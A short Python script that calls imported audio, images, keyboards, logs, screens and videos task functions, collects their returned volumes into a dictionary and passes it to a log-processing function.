from audio import audio_task
from images import images_task
from keyboards import keyboards_task
from logs import logs_task
from screens import screens_task
from videos import videos_task
from interface.processing import process_logs

def collect_data():
    audio_volume = audio_task()
    images_volume = images_task()
    keyboards_volume = keyboards_task()
    logs_volume = logs_task()
    screens_volume = screens_task()
    videos_volume = videos_task()

    data = {
        "audio": audio_volume,
        "images": images_volume,
        "keyboards": keyboards_volume,
        "logs": logs_volume,
        "screens": screens_volume,
        "videos": videos_volume
    }

    process_logs(data)

if __name__ == "__main__":
    collect_data()
